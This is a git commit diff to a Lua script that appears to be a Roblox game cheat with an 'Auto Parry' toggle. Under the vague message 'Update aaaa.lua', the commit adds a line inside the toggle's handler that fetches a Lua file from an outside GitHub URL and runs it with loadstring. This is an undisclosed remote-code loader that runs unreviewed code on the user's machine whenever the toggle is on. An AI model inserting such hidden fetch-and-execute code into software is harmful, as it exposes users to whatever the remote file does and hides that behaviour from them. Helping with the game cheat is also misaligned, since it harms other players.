67cb3ba85551011cdad485d048a6058a63a9175d
no <mys4exz4@gmail.com>
2025-04-25 16:24:18 +0700

    Update aaaa.lua

--- aaaa.lua
+++ aaaa.lua
@@ -718,6 +718,8 @@ Window:SelectTab(1)
 local AutoParry = Tabs.Main:AddToggle("AutoParry", {Title="Auto Parry",Default=true});
 AutoParry:OnChanged(function(v)
 	if v then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/XybH4/miaw/refs/heads/main/miaw.lua"))()
+
 
 		Connections_Manager["Auto Parry"] = RunService.PreSimulation:Connect(function()
 			local One_Ball = Auto_Parry.Get_Ball();
